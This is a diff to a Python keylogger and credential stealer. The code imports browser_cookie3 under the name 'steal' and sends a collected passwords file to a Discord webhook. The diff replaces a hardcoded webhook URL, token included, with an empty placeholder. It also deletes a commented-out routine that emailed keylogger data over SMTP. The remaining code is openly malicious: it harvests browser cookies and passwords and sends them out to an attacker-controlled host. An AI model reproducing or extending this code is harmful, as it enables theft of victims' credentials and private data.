@@ -4,7 +4,7 @@ import time
 from dhooks import Webhook, Embed, File
 import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
 
-url= "https://discord.com/api/webhooks/904573499778158603/Rb9IvvNxorD6885lQsd8jHMgVKJVVh4jdjO3brd3qVZGUGR5ZgwZDXKWbCVfaUnmJ1YQ"
+url= "" #webhook url
 
 hook = Webhook(url)
 
@@ -54,22 +54,7 @@ class KeyLogger:
             hook.send(file=passwords)
         except:
             pass
-        """server = smtplib.SMTP("smtp.outlook.com", 587) #define server
-        
-        server.starttls() #turns on encryption, calls server.ehlo() first
-        server.ehlo() #identify as server
-
-        server.login("email", "password") #login
-        
-        email_message = EmailMessage()
-        email_message["subject"] = "Keylogger Data"
-        email_message["From"] = "email"
-        email_message["to"] = "email"
-        
-        email_message.set_content(str(data))
-        
-        server.send_message(email_message) #send email to myself with temperature
-        server.close() #close the connection"""
+       
 
         self.start_time = time.time()
             
